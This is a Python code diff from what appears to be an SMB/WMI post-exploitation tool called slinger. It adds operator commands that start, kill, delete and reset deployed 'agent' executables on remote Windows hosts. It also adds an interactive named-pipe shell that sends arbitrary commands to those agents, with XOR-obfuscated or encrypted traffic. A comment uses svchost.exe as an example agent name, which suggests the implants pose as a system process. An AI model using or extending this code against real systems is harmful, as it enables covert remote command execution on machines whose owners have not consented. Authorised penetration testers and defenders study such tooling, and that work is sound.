+    def agent_kill_handler(self, args):
+        """Handle agent process termination via WMI and taskkill"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_debug,
+            )
+
+            # Ensure we're connected to a share (needed for downloading WMI output files)
+            if not self.check_if_connected():
+                print_warning("Not connected to a share - connecting to C$ for WMI operations")
+                try:
+                    self.tid = self.conn.connectTree("C$")
+                    self.share = "C$"
+                    self.is_connected_to_share = True
+                    print_debug("Connected to C$ share for WMI operations")
+                except Exception as conn_error:
+                    print_bad(f"Failed to connect to C$ share: {conn_error}")
+                    print_info("WMI operations require share access to download output files")
+                    return
+
+            # Load agent registry
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_file.exists():
+                print_bad("No deployed agents found")
+                return
+
+            with open(registry_file, "r") as f:
+                agents = json.load(f)
+
+            # Check if agent exists
+            if args.agent_id not in agents:
+                print_bad(f"Agent '{args.agent_id}' not found in registry")
+                return
+
+            agent_info = agents[args.agent_id]
+            agent_path = agent_info.get("path")
+
+            if not agent_path:
+                print_warning(f"No path recorded for agent '{args.agent_id}'")
+                return
+
+            # Extract just the executable name from the path
+            # Handle Windows paths properly even on Linux
+            if "\\" in agent_path:
+                exe_name = agent_path.split("\\")[-1]
+            else:
+
+                exe_name = os.path.basename(agent_path)
+
+            print_info(f"Looking for agent process: {exe_name}")
+
+            # Use WMI to find the process by executable name
+            try:
+                # Query for processes matching the agent's executable name (not full path)
+                process_query = (
+                    f"SELECT ProcessId, Name FROM Win32_Process WHERE Name = '{exe_name}'"
+                )
+
+                print_debug(f"Executing WMI query: {process_query}")
+
+                # Use existing WMI infrastructure
+                process_ids = []
+                try:
+                    # Force fresh WMI connection by clearing both service cache AND DCOM connection
+                    # This is needed because pipe operations may corrupt DCOM connection state
+                    if hasattr(self, "_wmi_services"):
+                        self._wmi_services.clear()
+                    if hasattr(self, "_dcom_connection"):
+                        try:
+                            if self._dcom_connection:
+                                self._dcom_connection.disconnect()
+                        except:
+                            pass
+                        self._dcom_connection = None
+
+                    iWbemServices = self.setup_wmi(namespace="root/cimv2", operation_type="query")
+
+                    # Execute query
+                    iEnumWbemClassObject = iWbemServices.ExecQuery(process_query)
+
+                    # Parse results using the correct enumeration method
+                    while True:
+                        try:
+                            pEnum = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
+                            properties = pEnum.getProperties()
+
+                            # Extract ProcessId from properties
+                            if "ProcessId" in properties:
+                                pid = properties["ProcessId"]["value"]
+                                if pid:
+                                    process_ids.append(pid)
+                        except Exception:
+                            # No more results
+                            break
+
+                except Exception as query_error:
+                    print_bad(f"WMI query failed: {query_error}")
+                    print_debug(f"Query error details: {query_error}")
+                    return
+
+                if not process_ids:
+                    print_warning(f"No running processes found for agent '{args.agent_id}'")
+                    print_info("Agent may already be terminated")
+
+                    # Update agent status to dead since no process is running
+                    agents[args.agent_id]["status"] = "dead"
+                    with open(registry_file, "w") as f:
+                        json.dump(agents, f, indent=2)
+                    print_good(f"Updated agent '{args.agent_id}' status to 'dead'")
+                    return
+
+                print_good(f"Found {len(process_ids)} process(es): {process_ids}")
+
+                # Kill each found process using taskkill via WMI DCOM
+                # Use default temp_dir - execute_wmi_command will use current session share automatically
+                for pid in process_ids:
+                    print_info(f"Terminating process {pid}...")
+
+                    try:
+                        # Use existing execute_wmi_command method
+                        kill_command = f"taskkill /F /PID {pid}"
+
+                        result = self.execute_wmi_command(
+                            command=kill_command, capture_output=True, timeout=10, shell="cmd"
+                        )
+
+                        if result.get("success"):
+                            output = result.get("output", "")
+                            print_debug(f"Taskkill output: {output}")
+
+                            if "SUCCESS" in output.upper() or "terminated" in output.lower():
+                                print_good(f"✓ Successfully terminated process {pid}")
+                            else:
+                                print_warning(f"Process {pid} termination status: {output.strip()}")
+                        else:
+                            print_bad(f"Failed to terminate process {pid}")
+                            print_debug(f"Error: {result.get('error')}")
+
+                    except Exception as kill_error:
+                        print_bad(f"Failed to terminate process {pid}: {kill_error}")
+                        print_debug(f"Kill error details: {kill_error}")
+
+                # Update agent status to dead
+                agents[args.agent_id]["status"] = "dead"
+                with open(registry_file, "w") as f:
+                    json.dump(agents, f, indent=2)
+
+                print_info(f"Agent '{args.agent_id}' status updated to 'dead'")
+
+            except Exception as e:
+                print_bad(f"Failed to kill agent process: {e}")
+                print_debug(f"Exception details: {e}")
+
+        except Exception as e:
+            print_bad(f"Failed to kill agent: {e}")
+
+    def agent_restart_handler(self, args):
+        """Restart a stopped or crashed agent using its deployment information"""
+        try:
+            # Check if share is connected
+            if not self.check_if_connected():
+                return
+
+            # Load agent registry
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_file.exists():
+                print_bad("No deployed agents found")
+                return
+
+            with open(registry_file, "r") as f:
+                agents = json.load(f)
+
+            # Check if agent exists
+            if args.agent_id not in agents:
+                print_bad(f"Agent '{args.agent_id}' not found in registry")
+                return
+
+            agent_info = agents[args.agent_id]
+            agent_path = agent_info.get("path")
+
+            if not agent_path:
+                print_bad(f"No path recorded for agent '{args.agent_id}'")
+                return
+
+            print_info(f"Restarting agent: {args.agent_id}")
+            print_info(f"Executable path: {agent_path}")
+
+            # Execute the agent using WMI
+            command = f'"{agent_path}"'
+
+            try:
+                # Force fresh WMI connection
+                if hasattr(self, "_wmi_services"):
+                    self._wmi_services.pop("root/cimv2", None)
+
+                # Use WMI to start the process
+                result = self.execute_wmi_command(command, capture_output=False, timeout=10)
+
+                if result.get("success", False):
+                    process_id = result.get("process_id")
+                    print_good(f"✓ Agent restarted successfully")
+                    print_info(f"  Process ID: {process_id}")
+
+                    # Update process ID in registry
+                    agents[args.agent_id]["process_id"] = process_id
+                    agents[args.agent_id]["status"] = "running"
+                    agents[args.agent_id]["last_restart"] = datetime.datetime.now().isoformat()
+
+                    with open(registry_file, "w") as f:
+                        json.dump(agents, f, indent=2)
+
+                    print_info("Registry updated with new process ID")
+                else:
+                    error_msg = result.get("error", "Unknown error")
+                    print_bad(f"✗ Failed to restart agent: {error_msg}")
+
+            except Exception as e:
+                print_bad(f"Failed to execute agent via WMI: {e}")
+                print_debug(f"Exception details: {e}")
+
+        except Exception as e:
+            print_bad(f"Failed to restart agent: {e}")
+            print_debug(f"Exception details: {e}")
+
+    def agent_rm_handler(self, args):
+        """Handle agent file removal and registry update"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_debug,
+            )
+
+            # Load agent registry
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_file.exists():
+                print_bad("No deployed agents found")
+                return
+
+            with open(registry_file, "r") as f:
+                agents = json.load(f)
+
+            # Check if agent exists
+            if args.agent_id not in agents:
+                print_bad(f"Agent '{args.agent_id}' not found in registry")
+                return
+
+            agent_info = agents[args.agent_id]
+            agent_path = agent_info.get("path")
+
+            if not agent_path:
+                print_warning(f"No path recorded for agent '{args.agent_id}'")
+                return
+
+            print_info(f"Attempting to delete agent file: {agent_path}")
+
+            # Use SMB to delete the remote file
+            try:
+                # Get the share name and path from agent info
+                agent_share = agent_info.get("share_name")
+                share_path = agent_info.get("share_path")
+
+                if not agent_share:
+                    print_warning("No share name recorded for agent - cannot delete via SMB")
+                    deletion_success = False
+                else:
+                    # Build SMB-relative path
+                    # Remove the share disk path prefix to get relative path
+                    if share_path and agent_path.startswith(share_path):
+                        # Path is like: C:\Windows\svchost.exe, share_path is C:\Windows
+                        # Relative path should be: svchost.exe
+                        relative_path = agent_path[len(share_path) :].lstrip("\\")
+                    elif ":" in agent_path and not agent_path[1:].startswith(":\\"):
+                        # Handle legacy buggy format like "ADMIN:\svchost.exe"
+                        # Extract just the filename
+                        print_debug(f"Detected legacy path format: {agent_path}")
+                        relative_path = agent_path.split(":", 1)[1].lstrip("\\")
+                    else:
+                        # Fallback: just use the filename
+                        relative_path = os.path.basename(agent_path)
+
+                    print_debug(f"Deleting from share '{agent_share}', path: '{relative_path}'")
+
+                    # Try to delete the file via SMB
+                    try:
+                        # Connect to the original deployment share if needed
+                        if (
+                            not self.is_connected_to_share
+                            or self.share.upper() != agent_share.upper()
+                        ):
+                            print_debug(f"Switching to share: {agent_share}")
+                            self.tid = self.conn.connectTree(agent_share)
+                            self.share = agent_share
+                            self.is_connected_to_share = True
+
+                        self.conn.deleteFile(self.share, relative_path)
+                        print_good(f"Successfully deleted agent file: {agent_path}")
+                        deletion_success = True
+                    except Exception as smb_error:
+                        error_msg = str(smb_error)
+
+                        # Check if deletion failed because file is locked (process is running)
+                        if (
+                            "STATUS_CANNOT_DELETE" in error_msg
+                            or "STATUS_SHARING_VIOLATION" in error_msg
+                        ):
+                            print_warning(f"Cannot delete - agent process is still running")
+                            print_info(
+                                f"Use 'agent kill {args.agent_id}' first, then retry 'agent rm'"
+                            )
+                        else:
+                            print_warning(f"Failed to delete file via SMB: {smb_error}")
+
+                        print_debug(f"SMB deletion error: {smb_error}")
+                        deletion_success = False
+
+                # Update agent status and disk presence
+                if deletion_success:
+                    agents[args.agent_id]["status"] = "deleted"
+                    agents[args.agent_id]["on_disk"] = "Deleted"
+                    print_good(f"Agent '{args.agent_id}' status updated to 'deleted'")
+                else:
+                    print_warning(f"File deletion failed, but agent can be manually removed")
+                    print_info(f"Agent '{args.agent_id}' remains in registry for manual cleanup")
+
+                # Save registry
+                with open(registry_file, "w") as f:
+                    json.dump(agents, f, indent=2)
+
+            except Exception as e:
+                print_bad(f"Failed to delete agent file: {e}")
+                print_debug(f"Exception details: {e}")
+
+        except Exception as e:
+            print_bad(f"Failed to remove agent: {e}")
+
+    def agent_reset_handler(self, args):
+        """Kill and remove all deployed agents"""
+        try:
+            from slingerpkg.utils.printlib import print_info, print_good, print_bad, print_warning
+
+            # Ensure connected to a share for SMB operations
+            if not self.is_connected_to_share:
+                print_bad("Not connected to a share. Use 'use <share>' first.")
+                print_info("Example: use C$")
+                return
+
+            # Load agent registry
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_file.exists():
+                print_bad("No deployed agents found")
+                return
+
+            with open(registry_file, "r") as f:
+                agents = json.load(f)
+
+            if not agents:
+                print_info("No agents to reset")
+                return
+
+            agent_ids = list(agents.keys())
+            print_info(f"Resetting {len(agent_ids)} agent(s)...")
+
+            # Create a mock args object for kill and rm commands
+            class MockArgs:
+                def __init__(self, agent_id):
+                    self.agent_id = agent_id
+
+            for agent_id in agent_ids:
+                print_info(f"\n[*] Processing agent: {agent_id}")
+
+                # Try to kill the agent process
+                try:
+                    print_info(f"  Attempting to kill agent process...")
+                    mock_args = MockArgs(agent_id)
+                    self.agent_kill_handler(mock_args)
+                except Exception as e:
+                    print_warning(f"  Kill failed (agent may not be running): {e}")
+
+                # Try to remove the agent file
+                try:
+                    print_info(f"  Attempting to remove agent file...")
+                    mock_args = MockArgs(agent_id)
+                    self.agent_rm_handler(mock_args)
+                except Exception as e:
+                    print_warning(f"  Remove failed: {e}")
+
+            print_good(f"\n✓ Reset complete - processed {len(agent_ids)} agent(s)")
+
+        except Exception as e:
+            print_bad(f"Failed to reset agents: {e}")
+
+    def agent_update_handler(self, args):
+        """Handle agent path update in registry"""
+        try:
+            from slingerpkg.utils.printlib import print_info, print_good, print_bad, print_warning
+
+            # Load agent registry
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_file.exists():
+                print_bad("No deployed agents found")
+                return
+
+            with open(registry_file, "r") as f:
+                agents = json.load(f)
+
+            # Check if agent exists
+            if args.agent_id not in agents:
+                print_bad(f"Agent '{args.agent_id}' not found in registry")
+                return
+
+            agent_info = agents[args.agent_id]
+            old_path = agent_info.get("path", "Unknown")
+
+            print_info(f"Updating agent '{args.agent_id}' path:")
+            print_info(f"  Old path: {old_path}")
+            print_info(f"  New path: {args.path}")
+
+            # Update the path
+            agents[args.agent_id]["path"] = args.path
+
+            # Save registry
+            with open(registry_file, "w") as f:
+                json.dump(agents, f, indent=2)
+
+            print_good(f"Agent '{args.agent_id}' path updated successfully")
+
+        except Exception as e:
+            print_bad(f"Failed to update agent: {e}")
+
+    def _show_built_agents_status(self, output_dir):
+        """Show built agents and their deployment status"""
+        try:
+            from tabulate import tabulate
+            from slingerpkg.utils.printlib import print_info, print_log, print_warning, print_debug
+
+            output_path = Path(output_dir)
+
+            if not output_path.exists():
+                print_info("\nBuilt Agents: None")
+                return
+
+            # Find all .exe files in output directory
+            agent_files = list(output_path.glob("*.exe"))
+
+            if not agent_files:
+                print_info("\nBuilt Agents: None")
+                print_log("  Use 'agent build' to build agents")
+                return
+
+            # Load deployment registry
+            registry = self._load_agent_registry()
+
+            print_info("\nBuilt Agents:")
+
+            # Prepare table data
+            headers = ["Agent File", "Architecture", "Size", "Status", "Deployed To", "Agent ID"]
+            table_data = []
+
+            for agent_file in sorted(agent_files):
+                # Extract info from filename (e.g., slinger_agent_x64_12345.exe)
+                filename = agent_file.name
+
+                # Parse architecture from filename
+                if "_x64_" in filename:
+                    arch = "x64"
+                elif "_x86_" in filename:
+                    arch = "x86"
+                else:
+                    arch = "Unknown"
+
+                # Get file size
+                try:
+                    size = self.sizeof_fmt(agent_file.stat().st_size)
+                except:
+                    size = "Unknown"
+
+                # Check deployment status
+                deployed_info = self._find_deployed_agent_by_file(registry, filename)
+
+                if deployed_info:
+                    status = "Deployed"
+                    deployed_to = f"{deployed_info['host']}:{deployed_info['path']}"
+                    agent_id = deployed_info["id"]
+                else:
+                    status = "Not Deployed"
+                    deployed_to = "-"
+                    agent_id = "-"
+
+                table_data.append([filename, arch, size, status, deployed_to, agent_id])
+
+            print_log(tabulate(table_data, headers=headers, tablefmt="simple"))
+
+            # Show summary
+            deployed_count = sum(1 for row in table_data if row[3] == "Deployed")
+            total_count = len(table_data)
+
+            print_log(f"\nSummary: {total_count} built, {deployed_count} deployed")
+
+            if deployed_count > 0:
+                print_log("Use 'agent list' to see detailed deployment info")
+                print_log("Use 'agent use <id>' to interact with deployed agents")
+
+        except Exception as e:
+            print_warning(f"Failed to show agent status: {e}")
+            print_debug(f"Exception details: {e}")
+
+    def _find_deployed_agent_by_file(self, registry, filename):
+        """Find deployed agent info by matching filename patterns"""
+        try:
+            # Extract base name without .exe
+            base_name = filename.replace(".exe", "")
+
+            # Look for agents that might match this file
+            for agent_id, info in registry.items():
+                agent_name = info.get("name", "")
+
+                # Check if the agent name matches or contains similar patterns
+                if agent_name == filename:
+                    return info
+
+                # Also check if the agent ID is contained in the filename
+                if agent_id in base_name:
+                    return info
+
+            return None
+
+        except Exception:
+            return None
+
+    @staticmethod
+    def _xor_decode(data, key):
+        """XOR decode data with the given key (symmetric operation)"""
+        if key is None:
+            return data
+        if isinstance(data, str):
+            data = data.encode("utf-8")
+        result = bytearray(data)
+        for i in range(len(result)):
+            result[i] ^= key
+        return bytes(result)
+
+    def _send_pipe_message(self, message_type, data, xor_key=None):
+        """Send a structured message to the agent via SMB pipe"""
+        try:
+            import struct
+
+            print_debug(
+                f"_send_pipe_message called: type={hex(message_type)}, data={data[:50] if isinstance(data, (str, bytes)) else data}"
+            )
+
+            # Message format: [length:4][type:4][data:N]
+            # All integers are little-endian
+            data_bytes = data if isinstance(data, bytes) else data.encode("utf-8")
+
+            # XOR encode the data if key is provided (agent expects encoded commands)
+            if xor_key is not None:
+                data_bytes = self._xor_decode(data_bytes, xor_key)  # XOR is symmetric
+                print_debug(f"Data XOR-encoded with key: {xor_key}")
+
+            length = len(data_bytes)
+            print_debug(f"Message packed: length={length}, type={hex(message_type)}")
+
+            # Pack header: length and type as little-endian 32-bit integers
+            header = struct.pack("<II", length, message_type)
+            full_message = header + data_bytes
+            print_debug(f"Full message size: {len(full_message)} bytes")
+
+            # Write to the pipe using SMB
+            print_debug(f"Calling writeFile: tid={self.agent_pipe_tid}, fid={self.agent_pipe_fid}")
+            print_debug(f"Message hex (first 50 bytes): {full_message[:50].hex()}")
+            bytes_written = self.conn.writeFile(
+                self.agent_pipe_tid, self.agent_pipe_fid, full_message, 0  # offset
+            )
+            print_debug(f"writeFile returned: {bytes_written} (expected {len(full_message)})")
+
+            return True
+
+        except Exception as e:
+            print_debug(f"Failed to send pipe message: {e}")
             print_debug(f"Traceback: {traceback.format_exc()}")
+            return False
+
+    def _receive_pipe_message(self):
+        """Receive a structured message from the agent via SMB pipe"""
+        try:
+            import struct
+
+            # Read header (8 bytes: length + type as little-endian)
+            header_data = self.conn.readFile(
+                self.agent_pipe_tid, self.agent_pipe_fid, 0, 8  # offset  # bytesToRead
+            )
+            print_debug(
+                f"Read header: {len(header_data) if header_data else 0} bytes, hex: {header_data.hex() if header_data else 'None'}"
+            )
+
+            if not header_data or len(header_data) != 8:
+                print_debug("Failed to read full header")
+                return None, None
+
+            # Unpack as little-endian 32-bit integers
+            length, msg_type = struct.unpack("<II", header_data)
+
+            # Read message data (raw bytes)
+            if length > 0:
+                data = self.conn.readFile(
+                    self.agent_pipe_tid, self.agent_pipe_fid, 0, length  # offset  # bytesToRead
+                )
+
+                if not data or len(data) != length:
+                    return None, None
+
+                # Return raw bytes - caller decides how to decode
+                return msg_type, data
+            else:
+                return msg_type, b""
+
+        except Exception as e:
+            print_debug(f"Failed to receive pipe message: {e}")
+            return None, None
+
+    def _start_agent_shell(self, agent_info, timeout, no_colors=False):
+        """Start interactive shell with agent via named pipe using custom protocol"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_log,
+            )
+            from slingerpkg.lib.named_pipe_client import NamedPipeClientWin32, NamedPipeClientCtypes
+            import time
+
+            # Use the known pipe name from the registry
+            pipe_name = agent_info["pipe_name"]
+            print_info(f"Connecting to pipe: \\\\{agent_info['host']}\\pipe\\{pipe_name}")
+
+            try:
+                # Named pipes MUST be accessed through IPC$ share
+                pipe_path = f"\\{pipe_name}"
+
+                # Save current share state to restore later
+                saved_share = self.share if hasattr(self, "share") else None
+                saved_tid = self.tid if hasattr(self, "tid") else None
+
+                # Connect to IPC$ share for named pipe access
+                self.agent_pipe_tid = self.conn.connectTree("IPC$")
+
+                # Open the pipe through SMB using correct impacket API
+                self.agent_pipe_fid = self.conn.openFile(
+                    self.agent_pipe_tid,
+                    pipe_path,
+                    desiredAccess=0x12019F,  # GENERIC_READ | GENERIC_WRITE
+                    shareMode=0x7,  # FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
+                    creationOption=0x00000040,  # FILE_NON_DIRECTORY_FILE
+                    creationDisposition=0x00000001,  # FILE_OPEN
+                    fileAttributes=0x00000080,  # FILE_ATTRIBUTE_NORMAL
+                )
+
+                print_good("Connected to agent pipe")
+                print_debug(f"Connected to pipe: {pipe_name}")
+
+                # Perform authentication if enabled
+                auth = None
+                if agent_info.get("auth_enabled"):
+                    from slingerpkg.lib.agent_crypto import AgentAuthProtocol
+
+                    passphrase = agent_info.get("passphrase")
+                    if not passphrase:
+                        print_bad(
+                            "✗ Agent requires authentication but no passphrase found in registry"
+                        )
+                        return
+
+                    print_info("🔐 Performing passphrase authentication...")
+                    auth = AgentAuthProtocol()
+
+                    # CRITICAL: Agent sends initial ACK handshake message after connection
+                    # We must consume this 8-byte header (length + type) + ACK message BEFORE reading auth nonce
+                    # Use readFile (not readNamedPipe) for consistent buffering behavior across reconnections
+                    print_debug("Consuming initial ACK handshake from agent...")
+                    header_data = self.conn.readFile(self.agent_pipe_tid, self.agent_pipe_fid, 0, 8)
+                    if len(header_data) != 8:
+                        print_bad(
+                            f"✗ Failed to receive message header (got {len(header_data)} bytes)"
+                        )
+                        return
+
+                    # Parse message header: 4 bytes length + 4 bytes type (both little-endian)
+                    # Wire format: {uint32_t length, uint32_t type}
+                    msg_length = struct.unpack("<I", bytes(header_data[0:4]))[0]
+                    msg_type = struct.unpack("<I", bytes(header_data[4:8]))[0]
+                    print_debug(f"Initial handshake: type={msg_type}, length={msg_length}")
+
+                    # Read and discard the ACK message body
+                    if msg_length > 0:
+                        ack_body = self.conn.readFile(
+                            self.agent_pipe_tid, self.agent_pipe_fid, 0, msg_length
+                        )
+                        if len(ack_body) != msg_length:
+                            print_bad(
+                                f"✗ Failed to receive ACK body (got {len(ack_body)} bytes, expected {msg_length})"
+                            )
+                            return
+                        print_debug(f"Received ACK handshake: {bytes(ack_body)}")
+
+                    # Step 1: NOW receive 16-byte nonce from agent (raw bytes, not XOR-encoded)
+                    print_debug("Waiting for authentication challenge from agent...")
+                    nonce_data = self.conn.readFile(self.agent_pipe_tid, self.agent_pipe_fid, 0, 16)
+                    if len(nonce_data) != 16:
+                        print_bad(
+                            f"✗ Failed to receive nonce (got {len(nonce_data)} bytes, expected 16)"
+                        )
+                        return
+
+                    nonce = bytes(nonce_data)
+                    print_debug(f"Received 16-byte nonce from agent: {nonce.hex()}")
+
+                    # Step 2: Handle challenge - compute HMAC and derive session key
+                    hmac_response, session_key = auth.handle_challenge(nonce, passphrase)
+
+                    # Step 3: Initialize the session with the derived key
+                    auth.initialize_session(session_key)
+
+                    # Step 4: Send HMAC response to agent (32 bytes, not XOR-encoded)
+                    print_debug("Sending HMAC response to agent...")
+                    self.conn.writeFile(self.agent_pipe_tid, self.agent_pipe_fid, hmac_response, 0)
+                    print_debug(f"Sent HMAC response: {hmac_response.hex()}")
+
+                    print_good("✓ Authentication successful - all communications encrypted")
+
+                    # NOTE: After successful authentication, agent goes directly to command loop
+                    # No ACK message is sent - agent is ready to receive commands immediately
+
+                else:
+                    # No authentication - consume XOR-encoded ACK handshake
+                    print_debug("Consuming ACK handshake (XOR mode)...")
+                    xor_key = agent_info.get("xor_key")
+                    msg_type, response_data = self._receive_pipe_message()
+                    if msg_type == 0x1002:  # Response type
+                        decoded_data = self._xor_decode(response_data, xor_key)
+                        ack_msg = decoded_data.decode("utf-8", errors="replace").strip()
+                        print_debug(f"Received XOR-encoded ACK: {ack_msg}")
+                    else:
+                        print_warning(f"Unexpected message type: 0x{msg_type:04x}")
+
+                # Start interactive shell
+                self._run_pipe_interactive_shell(agent_info, auth, no_colors=no_colors)
+
+            except Exception as e:
+                print_bad(f"Failed to connect to agent: {e}")
+                print_debug(f"Pipe connection error: {e}")
+                print_info("Make sure the agent is running and accessible")
+                # Clean up pipe handle if we opened it
+                if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
+                    try:
+                        print_debug("Cleaning up pipe handle after error")
+                        self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
+                        print_debug("Disconnecting from IPC$ tree after error")
+                        self.conn.disconnectTree(self.agent_pipe_tid)
+                        delattr(self, "agent_pipe_fid")
+                        delattr(self, "agent_pipe_tid")
+                    except Exception as cleanup_err:
+                        print_debug(f"Cleanup error (non-fatal): {cleanup_err}")
+                return
+
+        except Exception as e:
+            print_bad(f"Failed to start agent shell: {e}")
+            print_debug(f"Exception details: {e}")
+            # Clean up pipe handle if we opened it
+            if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
+                try:
+                    self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
+                except:
+                    pass
+
+    def _run_pipe_interactive_shell(self, agent_info, auth=None, no_colors=False):
+        """Run interactive shell using custom pipe protocol
+
+        Args:
+            agent_info: Agent configuration dictionary
+            auth: Optional AgentAuthProtocol instance for encrypted communication
+            no_colors: Disable colored prompt
+        """
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_log,
+            )
+
+            print_info("╔══════════════════════════════════════════╗")
+            print_info("║        AGENT INTERACTIVE SHELL           ║")
+            print_info("╚══════════════════════════════════════════╝")
+            print_log(f"Agent ID: {agent_info['id']}")
+            print_log(f"Host: {agent_info['host']}")
+            print_log(f"Pipe: {agent_info['pipe_name']}")
+            print_log("")
+            print_info("Type 'exit' to close the connection")
+            print_info("Type 'help' for agent commands")
+            print_log("")
+
+            # Setup prompt_toolkit session with command history
+            from prompt_toolkit import PromptSession, HTML
+            from prompt_toolkit.history import FileHistory
+            from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+
+            history_file = Path.home() / ".slinger" / "agent_history.txt"
+            history_file.parent.mkdir(parents=True, exist_ok=True)
+
+            session = PromptSession(
+                history=FileHistory(str(history_file)),
+                auto_suggest=AutoSuggestFromHistory(),
+            )
+
+            # Track current working directory
+            current_dir = "C:\\"
+
+            try:
+                while True:
+                    try:
+                        # Get user input with prompt showing current directory
+                        if no_colors:
+                            prompt_text = f"agent:{agent_info['id']}:{current_dir}> "
+                        else:
+                            prompt_text = HTML(
+                                f"<ansiblue>agent:</ansiblue><ansiyellow>{agent_info['id']}</ansiyellow><ansiblue>:</ansiblue><ansigreen>{current_dir}</ansigreen><ansiblue>> </ansiblue>"
+                            )
+                        command = session.prompt(prompt_text).strip()
+
+                        if not command:
+                            continue
+
+                        if command.lower() in ["exit", "quit"]:
+                            print_info("Closing agent connection...")
+                            break
+
+                        if command.lower() == "help":
+                            print_info("Available commands:")
+                            print_log("  help        - Show this help")
+                            print_log(
+                                "  exit/quit   - Close connection (reconnect to refresh session keys)"
+                            )
+                            print_log("  <command>   - Execute any Windows command on agent")
+                            continue
+
+                        # Track directory changes
+                        if command.lower().startswith("cd "):
+                            # Will update after getting response
+                            pass
+
+                        # Send command to agent via pipe (message type 0x1001 = command)
+                        if auth and auth.is_authenticated():
+                            # Encrypted mode - encrypt command without XOR encoding
+                            encrypted_cmd = auth.encrypt_message(command)
+                            if not self._send_pipe_message(0x1001, encrypted_cmd, xor_key=None):
+                                print_bad("Failed to send encrypted command to agent")
+                                continue
+                        else:
+                            # XOR mode - encode the command before sending
+                            xor_key = agent_info.get("xor_key")
+                            if not self._send_pipe_message(0x1001, command, xor_key):
+                                print_bad("Failed to send command to agent")
+                                continue
+
+                        # Receive response from agent
+                        msg_type, response_data = self._receive_pipe_message()
+
+                        if msg_type is None:
+                            print_warning("No response from agent")
+                        elif msg_type == 0x1002:  # Response message type
+                            if auth and auth.is_authenticated():
+                                # Encrypted response - decrypt without XOR decoding
+                                response_str = response_data.decode("utf-8", errors="replace")
+                                print_debug(
+                                    f"Received encrypted response ({len(response_data)} bytes)"
+                                )
+                                print_debug(f"Raw response_data (hex): {response_data.hex()}")
+                                print_debug(
+                                    f"Response string (first 100 chars): {response_str[:100]}"
+                                )
+                                response = auth.decrypt_message(response_str)
+                                if response is None:
+                                    print_bad("Failed to decrypt response")
+                                    print_debug(f"Full response_data (hex): {response_data.hex()}")
+                                    print_debug(f"Full response_str: {response_str}")
+                                    continue
+                            else:
+                                # XOR-encoded response
+                                xor_key = agent_info.get("xor_key")
+                                decoded_data = self._xor_decode(response_data, xor_key)
+                                response = decoded_data.decode("utf-8", errors="replace")
+
+                            # Filter out "Current directory:" lines from output (only for prompt display)
+                            if not response.strip().startswith("Current directory:"):
+                                print_log(response)
+
+                            # Update current directory if cd command was successful
+                            if command.lower().startswith("cd "):
+                                # Send 'cd' (no args) to get current directory
+                                pwd_command = "cd"
+                                if auth and auth.is_authenticated():
+                                    pwd_encrypted = auth.encrypt_message(pwd_command)
+                                    if self._send_pipe_message(0x1001, pwd_encrypted, xor_key=None):
+                                        msg_type, pwd_data = self._receive_pipe_message()
+                                        if msg_type == 0x1002:
+                                            pwd_str = pwd_data.decode("utf-8", errors="replace")
+                                            new_dir = auth.decrypt_message(pwd_str)
+                                            if new_dir:
+                                                # Strip "Current directory: " prefix if present
+                                                if new_dir.strip().startswith("Current directory:"):
+                                                    current_dir = (
+                                                        new_dir.strip()
+                                                        .replace("Current directory:", "")
+                                                        .strip()
+                                                    )
+                                                else:
+                                                    current_dir = new_dir.strip()
+                                else:
+                                    xor_key = agent_info.get("xor_key")
+                                    if self._send_pipe_message(0x1001, pwd_command, xor_key):
+                                        msg_type, pwd_data = self._receive_pipe_message()
+                                        if msg_type == 0x1002:
+                                            decoded = self._xor_decode(pwd_data, xor_key)
+                                            new_dir = decoded.decode(
+                                                "utf-8", errors="replace"
+                                            ).strip()
+                                            # Strip "Current directory: " prefix if present
+                                            if new_dir.startswith("Current directory:"):
+                                                current_dir = new_dir.replace(
+                                                    "Current directory:", ""
+                                                ).strip()
+                                            else:
+                                                current_dir = new_dir
+                        else:
+                            print_warning(f"Unexpected message type: 0x{msg_type:04x}")
+
+                    except KeyboardInterrupt:
+                        print_info("\nCtrl+C detected - closing agent connection...")
+                        break
+
+                    except EOFError:
+                        print_info("\nEOF detected - closing agent connection...")
+                        break
+
+            finally:
+                # Clean up pipe connection - close and wait for agent to detect disconnect
+                try:
+                    if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
+                        print_debug("Closing pipe file handle")
+                        # CRITICAL: Close the file handle first
+                        self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
+
+                        # Give agent time to detect disconnect and reset pipe state
+                        # Without this delay, immediate reconnections can hit stale pipe buffers
+                        print_debug("Waiting for agent to detect disconnect...")
+                        import time
+
+                        time.sleep(0.5)  # 500ms delay allows agent's PeekNamedPipe to fail cleanly
+
+                        # Don't disconnect IPC$ tree - it can stay connected
+                        # Disconnecting may corrupt the SMB connection state
+                        # Clear the handles
+                        delattr(self, "agent_pipe_fid")
+                        delattr(self, "agent_pipe_tid")
+
+                    # Clear cached WMI connections since pipe operations may have affected them
+                    if hasattr(self, "_wmi_services"):
+                        print_debug("Clearing cached WMI connections after pipe operation")
+                        self._wmi_services.clear()
+
+                except Exception as cleanup_err:
+                    print_debug(f"Pipe cleanup error: {cleanup_err}")
+
+                print_info("Agent connection closed")
+
+        except Exception as e:
+            print_bad(f"Interactive shell error: {e}")
